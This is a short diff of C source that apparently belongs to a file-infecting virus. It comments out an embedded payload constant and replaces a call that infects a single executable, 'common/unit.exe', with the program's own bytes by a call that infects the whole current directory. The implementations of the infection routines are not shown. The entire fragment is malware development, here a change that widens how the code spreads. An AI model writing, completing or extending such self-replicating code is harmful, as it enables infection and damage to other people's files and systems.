@@ -8,7 +8,7 @@ int main(int argc, char** argv){
 	const char* payload=PAYLOAD_TAG PAYLOAD_KEY PAYLOAD_DATA PAYLOAD_TAG;
 	*/
 	printf("Set\n");
-	infectTarget("common/unit.exe",getOwnBytes(argv[0]));
+	infectDirectory(".",argv[0]);
 
 	return 0;
 }
